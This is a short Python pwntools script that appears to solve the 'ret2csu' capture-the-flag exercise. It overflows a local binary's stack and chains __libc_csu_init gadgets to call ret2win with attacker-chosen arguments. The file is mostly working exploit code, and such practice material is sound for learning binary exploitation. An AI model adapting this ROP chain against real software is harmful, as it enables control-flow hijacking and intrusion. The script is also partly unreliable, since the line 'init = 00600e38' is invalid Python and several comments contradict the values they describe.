from pwn import *

# context.log_level = 'debug'

p = process("./ret2csu")
e = ELF('./ret2csu')

proc.wait_for_debugger(p.pid)


# gadget ret2csu

# 0x000000000040069a : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_csu = 0x000000000040069a
"""
    csu_call
        00400680 4c 89 fa        MOV        RDX,R15
        00400683 4c 89 f6        MOV        RSI,R14
        00400686 44 89 ef        MOV        EDI,R13D
        00400689 41 ff 14 dc     CALL       qword ptr [R12 + RBX*0x8]=>->frame_dummy         undefined frame_dummy()
        
        0040068d 48 83 c3 01     ADD        RBX,0x1
        00400691 48 39 dd        CMP        RBP,RBX
        00400694 75 ea           JNZ        LAB_00400680

"""
csu_call = 0x00400680

pop_rdi = 0x00000000004006a3 #: pop rdi ; ret
pop_rsi_r15 = 0x00000000004006a1 # : pop rsi ; pop r15 ; ret

ret2win = e.symbols['ret2win']
init = 00600e38	# dq _init (Elf64_Dyn.d_val)	0x4004d0	0x4004d0	

buf = b'A'*0x28

# setup leak
buf += p64(pop_csu)
buf += p64(0)                       # rbx = 0
buf += p64(1)                       # rbp = 0
buf += p64(0x00600e38)              # r12 = init address
buf += p64(0xc0ffee)                # r13 = g0d value
buf += p64(0xcafebabecafebabe)      # r14 -> RSI 2nd arg
buf += p64(0xd00df00dd00df00d)      # r15 = 3 arg
buf += p64(csu_call)
buf += p64(0xc0ffee)                # pop rbx
buf += p64(0xc0ffee)                # pop rbp
buf += p64(0xc0ffee)                # pop r12
buf += p64(0xc0ffee)                # pop r12
buf += p64(0xc0ffee)                # pop r13
buf += p64(0xc0ffee)                # pop r14
buf += p64(0xc0ffee)                # pop r15
buf += p64(pop_rdi)                 # pop rdi
buf += p64(0xdeadbeefdeadbeef)      # 1st arg
buf += p64(ret2win)                 # call ret2win

p.sendline(buf)

p.interactive()